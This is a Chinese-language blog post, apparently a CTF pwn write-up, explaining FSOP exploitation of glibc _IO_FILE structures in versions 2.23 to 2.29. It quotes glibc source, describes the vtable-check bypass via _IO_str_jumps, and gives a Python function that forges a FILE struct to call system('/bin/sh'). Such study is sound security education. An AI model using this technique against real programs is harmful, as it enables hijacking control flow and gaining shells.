class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="keyword">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    ...</span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">     || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">         &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">            &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">     )</span><br><span class="line">    &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">  result = EOF;</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">  fp = fp-&gt;_chain;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过对上面代码的分析我们知道fp-&gt;_IO_write_base处保存这输出缓冲区的数据，并且长度为fp-&gt;_IO_write_ptr-fp-&gt;_IO_write_base，所以上面的if语句实际上就是判断缓冲区是否还有数据，如果有的话就会调用_IO_OVERFLOW去清空缓冲区，其中_IO_OVERFLOW是vtable当中的函数，所以我们若是能够控制_IO_list_all的话就可以控制程序执行流。</p><p>而_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：</p><ol><li><p>当 libc 执行 abort 流程时</p></li><li><p>当执行 exit 函数时</p></li><li><p>当执行流从 main 函数返回时</p></li></ol><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>伪造_IO_FILE结构体，并且利用漏洞使_IO_list_all指向我们伪造的结构体(当然这里我们可以使用任意结构体_chain字段)，最终触发_IO_flush_all_lockp，绕过检查实现执行流的劫持。</p><p>其中需要绕过的也就是上面的缓冲区，所以只需要</p><blockquote><p>fp-&gt;_mode = 0;</p><p>fp-&gt;_IO_write_ptr = 1;</p><p>fp-&gt;_IO_write_base=0;</p></blockquote><p>最后把vtable修改为我们的system就好。</p><h2 id="Glibc2-24到Glibc2-27下的FSOP"><a href="#Glibc2-24到Glibc2-27下的FSOP" class="headerlink" title="Glibc2.24到Glibc2.27下的FSOP"></a>Glibc2.24到Glibc2.27下的FSOP</h2><p>在Glibc2.24下，若是直接同上面的构造方式构造就会出现报错，这是因为在这个版本的Glibc下存在一种保护机制。</p><h3 id="vtable-check机制分析"><a href="#vtable-check机制分析" class="headerlink" title="vtable check机制分析"></a>vtable check机制分析</h3><p>在执行_IO_OVERLOW时，会先执行到IO_validate_vtable函数，这是因为_IO_OVERLOW的宏定义发生了改变</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> _IO_JUMPS_FUNC(THIS) \</span></span><br><span class="line"><span class="meta">  (IO_validate_vtable                                                   \</span></span><br><span class="line"><span class="meta">   (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS)   \</span></span><br><span class="line"><span class="meta">                 + (THIS)-&gt;_vtable_offset)))</span></span><br></pre></td></tr></table></figure><p>可以看到是在最后调用vtable的函数之前调用了IO_validate_vtable函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> struct _IO_jump_t *</span></span><br><span class="line"><span class="function"><span class="title">IO_validate_vtable</span> <span class="params">(<span class="keyword">const</span> struct _IO_jump_t *vtable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *ptr = (<span class="keyword">const</span> <span class="keyword">char</span> *) vtable;</span><br><span class="line">  <span class="keyword">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上述代码当中，__start___libc_IO_vtables指向了第一个vtable的地址_IO_helper_jumps，__stop___libc_IO_vtables指向了最后一个vtable函数_IO_str_chk_jumps的结束地址。上面检验的就是当前的vtable是否在这两个地址之间。因此，简单的覆盖vtable是无法通过检查的。</p><h3 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h3><p>其实在上述的check机制分析当中还存在一个检查外部vtable是否合法，不过存在的问题是我们无法控制flag，因为其是随机产生的。所以，我们使用的利用方式还是内部的vtable，使用到了vtable是_IO_str_jumps。</p><p>首先观察其源码当中定义的函数表：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上面是我在Glibc源码当中看到的，下面是我调试出来的：</p><p><img src="/images/image-20220223112300491.png" alt="image-20220223112300491"></p><p>不过可以看到的是源码中的JUMP_INIT_DUMMY占了16字节。所以_IO_str_finish的偏移量为0x10，而_IO_str_overflow的偏移量为0x18。</p><p>再来看_IO_str_finish的源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="keyword">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base); </span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到直接使用了fp-&gt;_s._free_buffer当作函数地址，参数即为_IO_buf_base。到了这一步，利用方式就很明显了。</p><p>下面构造结构体，同样的，我们仍需要绕过之前_IO_flush_all_lokcp函数中的检测，也就是_mode&lt;=0以及_IO_write_ptr&gt;_IO_write_base。然后重点就是vtable的地址我们不能直接的_IO_str_jumps，我们应当写入_IO_str_jumps-8，这里解释一下，因为我们在绕过_IO_flush_all_lokcp的检查后会调用到_IO_OVERFLOW函数，但是我们真正要进入的其实是_IO_str_finish函数，又因为他相对与vtable的偏移量刚好比_IO_OVERFLOW小8个字节，所以减去8即可执行到_IO_str_finish。</p><p>接着问题就是(((_IO_strfile *) fp)-&gt;_s._free_buffer)函数相对于fp的偏移量是多少，调试结果出来发现偏移量是0xe8，最后在fp-&gt;_IO_buf_base的地方写上/bin/sh的地址即可getshell。</p><p>这里给出打包的函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file</span>(<span class="params">_IO_read_base=<span class="number">0</span>, _IO_write_base=<span class="number">0</span>, _IO_write_ptr=<span class="number">0</span>, _IO_buf_base=<span class="number">0</span>, _mode=<span class="number">0</span>, vtable=<span class="number">0</span></span>):</span></span><br><span class="line">    IO_FILE = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(_IO_read_base) + \</span><br><span class="line">        p64(_IO_write_base)+p64(_IO_write_ptr)+p64(<span class="number">0</span>)+p64(_IO_buf_base)</span><br><span class="line">    IO_FILE = IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    IO_FILE += p32(_mode)</span><br><span class="line">    IO_FILE = IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>)+p64(vtable)</span><br><span class="line">    <span class="keyword">return</span> IO_FILE</span><br><span class="line"></span><br><span class="line">file_struct = pack_file(IO_list_all, <span class="number">0</span>, <span class="number">1</span>, bin_sh_addr, <span class="number">0</span>, IO_str_jumps-<span class="number">8</span>)</span><br><span class="line">file_struct += p64(<span class="number">0</span>)+p64(system_addr)</span><br></pre></td></tr></table></figure><p>这是我上一篇复现的exp当中的函数，我是根据其他师傅的exp写的，但是这里的_IO_read_base我也没在源码中看到有什么检验，我估计不用加上也行。</p><h2 id="Glibc2-29下的FSOP"><a href="#Glibc2-29下的FSOP" class="headerlink" title="Glibc2.29下的FSOP"></a>Glibc2.29下的FSOP</h2><p>这应该是最后一个可以用FSOP的版本了，在Glibc2.31也会有这方面的使用，不过都不能直接getshell了。</p><p>首先注意的是，我们在上面使用的是_IO_str_finish函数来利用的，但是这里的函数源码发生了改变：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_str_finish (FILE *fp, <span class="keyword">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里直接替换成了free，所以我们这里是没有利用空间的了。</p><p>其他师傅的查找发现在_IO_wfile_jumps这个vtable里依旧存在大量的函数指针，而且当中最好利用的则是_IO_wfile_sync函数，一样的先看一下源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">wint_t</span></span><br><span class="line">_IO_wfile_sync (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> delta;</span><br><span class="line">  <span class="keyword">wint_t</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*    char* ptr = cur_ptr(); */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (fp))</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">  delta = fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">  <span class="keyword">if</span> (delta != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We have to find out how many bytes we have to go back in the</span></span><br><span class="line"><span class="comment"> external buffer.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cv</span> =</span> fp-&gt;_codecvt;</span><br><span class="line">      <span class="keyword">off64_t</span> new_pos;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">int</span> clen = (*cv-&gt;__codecvt_do_encoding) (cv);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (clen &gt; <span class="number">0</span>)</span><br><span class="line"><span class="comment">/* It is easy, a fixed number of input bytes are used for each</span></span><br><span class="line"><span class="comment">   wide character.  */</span></span><br><span class="line">delta *= clen;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We have to find out the hard way how much to back off.</span></span><br><span class="line"><span class="comment">     To do this we determine how much input we needed to</span></span><br><span class="line"><span class="comment">     generate the wide characters up to the current reading</span></span><br><span class="line"><span class="comment">     position.  */</span></span><br><span class="line">  <span class="keyword">int</span> nread;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_state = fp-&gt;_wide_data-&gt;_IO_last_state;</span><br><span class="line">  nread = (*cv-&gt;__codecvt_do_length) (cv, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">      fp-&gt;_IO_read_base,</span><br><span class="line">      fp-&gt;_IO_read_end, delta);</span><br><span class="line">  fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_base + nread;</span><br><span class="line">  delta = -(fp-&gt;_IO_read_end - fp-&gt;_IO_read_base - nread);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      new_pos = _IO_SYSSEEK (fp, delta, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos != (<span class="keyword">off64_t</span>) EOF)</span><br><span class="line">&#123;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_end = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (errno == ESPIPE)</span><br><span class="line">; <span class="comment">/* Ignore error from unseekable devices. */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">retval = WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (retval != WEOF)</span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="comment">/* <span class="doctag">FIXME:</span> Cleanup - can this be shared? */</span></span><br><span class="line">  <span class="comment">/*    setg(base(), ptr, ptr); */</span></span><br><span class="line">  <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以注意到的是这两行代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cv</span> =</span> fp-&gt;_codecvt;</span><br><span class="line"><span class="keyword">int</span> clen = (*cv-&gt;__codecvt_do_encoding) (cv);</span><br></pre></td></tr></table></figure><p>这里又是将fp-&gt;_codecvt-&gt;__codecvt_do_encoding来做为函数来执行，参数则是fp-&gt;_codecvt</p><p>再看_IO_codecvt结构体在源码是什么样子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> (*__codecvt_destr) (struct _IO_codecvt *);</span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> (*__<span class="title">codecvt_do_out</span>) (<span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *,</span></span><br><span class="line"><span class="class">     __<span class="title">mbstate_t</span> *,</span></span><br><span class="line"><span class="class">     <span class="title">const</span> <span class="title">wchar_t</span> *,</span></span><br><span class="line"><span class="class">     <span class="title">const</span> <span class="title">wchar_t</span> *,</span></span><br><span class="line"><span class="class">     <span class="title">const</span> <span class="title">wchar_t</span> **, <span class="title">char</span> *,</span></span><br><span class="line"><span class="class">     <span class="title">char</span> *, <span class="title">char</span> **);</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> (*__<span class="title">codecvt_do_unshift</span>) (<span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *,</span></span><br><span class="line"><span class="class"> __<span class="title">mbstate_t</span> *, <span class="title">char</span> *,</span></span><br><span class="line"><span class="class"> <span class="title">char</span> *, <span class="title">char</span> **);</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> (*__<span class="title">codecvt_do_in</span>) (<span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *,</span></span><br><span class="line"><span class="class">    __<span class="title">mbstate_t</span> *,</span></span><br><span class="line"><span class="class">    <span class="title">const</span> <span class="title">char</span> *, <span class="title">const</span> <span class="title">char</span> *,</span></span><br><span class="line"><span class="class">    <span class="title">const</span> <span class="title">char</span> **, <span class="title">wchar_t</span> *,</span></span><br><span class="line"><span class="class">    <span class="title">wchar_t</span> *, <span class="title">wchar_t</span> **);</span></span><br><span class="line">  <span class="keyword">int</span> (*__codecvt_do_encoding) (struct _IO_codecvt *);</span><br><span class="line">  <span class="keyword">int</span> (*__codecvt_do_always_noconv) (struct _IO_codecvt *);</span><br><span class="line">  <span class="keyword">int</span> (*__codecvt_do_length) (struct _IO_codecvt *, <span class="keyword">__mbstate_t</span> *,</span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">size_t</span>);</span><br><span class="line">  <span class="keyword">int</span> (*__codecvt_do_max_length) (struct _IO_codecvt *);</span><br><span class="line"></span><br><span class="line">  _IO_iconv_t __cd_in;</span><br><span class="line">  _IO_iconv_t __cd_out;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到这里的__codecvt_do_encoding偏移量为4，所以要进行利用只需要满足以下条件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.f</span>p-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line"><span class="number">2.f</span>p-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end</span><br><span class="line"><span class="number">3.</span>*(fp-&gt;_codecvt+<span class="number">4</span>)=func,参数就是fp-&gt;_codecvt</span><br></pre></td></tr></table></figure><p>当然，我们这里依旧需要绕过_IO_flush_all_lokcp函数。</p><p>后面会在梳理house_of_pig也就是在Glibc2.31下的利用。</p><hr><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a class="link"   href="https://darkeyer.github.io/2020/08/17/FSOP%E5%9C%A8glibc2.29%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/" >https://darkeyer.github.io/2020/08/17/FSOP%E5%9C%A8glibc2.29%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://xz.aliyun.com/t/5579" >https://xz.aliyun.com/t/5579<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;文章开头给出_IO_FILE结构体的偏移:&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="FSOP" scheme="https://cv196082.gitee.io/tags/FSOP/"/>
    
  </entry>
  
</feed>
